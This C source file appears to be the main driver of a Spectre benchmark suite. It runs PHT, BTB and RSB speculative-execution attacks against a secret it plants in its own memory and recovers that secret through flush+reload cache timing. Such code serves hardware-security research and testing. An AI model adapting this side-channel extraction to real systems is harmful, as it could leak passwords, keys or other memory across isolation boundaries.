#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>

#include "sidechannel/flush_reload.h"
#include "defines.h"
#include "util.h"


#include "btb/btb.h"
#include "pht/pht.h"
#include "rsb/rsb.h"


struct testTarget{
    char* testname;
    void (*testfun) (void*);
    uint8_t marked;
};

struct testTarget tests[] = {
    {"pht", &pht_atk, 0},
    {"btb", &btb_atk, 0},
    {"rsb", &rsb_atk, 0},
};
int max_tests = 3;


char* oracle_block;
int junk;
int* results;
char* victim_block;
void (*testfun) (void*);
unsigned int array1_size = 16;

FILE *fptr;
struct args a;

void readMemoryBrace(void* info, uint8_t value[2], int score[2]){
    static int tries, i, j, k, mix_i;
    static uint64_t start, end;

    memset(results,0,256*sizeof(int));
    for (tries = TRIES; tries > 0; tries--) {
        if (a.time_extract){
            start = __rdtscp(&junk);
        }
        _mm_mfence();
        testfun(info);
        
        _mm_mfence();
        if (a.time_extract){
            end = __rdtscp(&junk);
            printf("time: %d, ", end-start);
            if (fptr){
                fprintf(fptr,"time: %d, ", end-start);
            }
        }
        probe(oracle_block,CACHE_MISS, PAGESIZE, results);
        _mm_mfence();


        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
            k = j;
            j = i;
            } else if (k < 0 || results[i] >= results[k]) {
            k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */

    }
    value[0] = (uint8_t) j;
    score[0] = results[j];
    value[1] = (uint8_t) k;
    score[1] = results[k];
}


int main(int argc, const char **argv) {
    // Detect cache threshold
    char* secret;
    size_t len = sizeof(SECRET) - 1;

    char cc;
    int i,t, score[2];
    uint8_t value[2];

    if (parse(argc,argv,&a) != 0){
        printf("error in argument parsing\n");
        return 1;
    }

    if (a.filename != 0){
        fptr = fopen(a.filename, "w");
        fprintf(fptr, "spectre benchmark log\n");
        fprintf(fptr, "running tests:");
    }

    // mark tests

    for (t = max_tests-1; t >= 0; t--){
        if ((a.tests_to_run & (1 << t)) == (1 << t) || a.tests_to_run <= 0){
            tests[t].marked = 1;
            if (fptr){
                fprintf(fptr, "%s, ", tests[t].testname);
            }
        }
    }

    if (fptr){
        fprintf(fptr, "\n", tests[t].testname);
    }

    // setup flush-reload channel
    oracle_block = malloc(256 * PAGESIZE);
    memset(oracle_block, 1, 256*PAGESIZE);
    flush(oracle_block, PAGESIZE);

    // setup score block
    results = malloc(256* sizeof(int));
    memset(results,0,256*sizeof(int));

    // initialise victim block: first, allocate memory
    victim_block = malloc(array1_size + len);


    // then, fill with 16 "visible" elements, then with secret;
    memset(victim_block,1,array1_size);
    secret = victim_block + array1_size;
    memcpy(secret, SECRET, len);
    
    _mm_mfence();


    // actual tests
    for (t = 0; t < max_tests; t++){
        if (!tests[t].marked){
            continue;
        }
        printf("\n%s test...\n", tests[t].testname);
        if (fptr){
            fprintf(fptr, "%s test results: \n", tests[t].testname);
        }
        testfun = tests[t].testfun;
        for (i = 0; i < len; i++) {
            printf("reading character... ");
            switch (t){
                case 0:
                    readMemoryBrace(array1_size + i, value, score); // pht
                    break;
                case 1:
                    readMemoryBrace(secret + i, value, score); // btb
                    break;
                case 2:
                    cc = secret[i];// precomputation of character to extract
                    readMemoryBrace(cc, value, score); // rsb
                    break;
            }
            
            printf("%s: ", (score[0] >= 2 * score[1] ? "success" : "unclear"));
            printf("0x%02X='%c' score=%d ", value[0],
                (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
            if (score[1] > 0)
                printf("(second best: 0x%02X score=%d)", value[1], score[1]);
            printf("\n");
            if (fptr){
                fprintf(fptr, "|| %3d (score %2d)", value[0], score[0]);
                if (score[1]) fprintf(fptr, " second %3d (score %2d)", value[1], score[1]);
                fprintf(fptr, ", expected %3d\n", secret[i]);
            }
        }
    }

    if (fptr){
        fclose(fptr);
    }
    
    free(oracle_block);

    return (0);
}
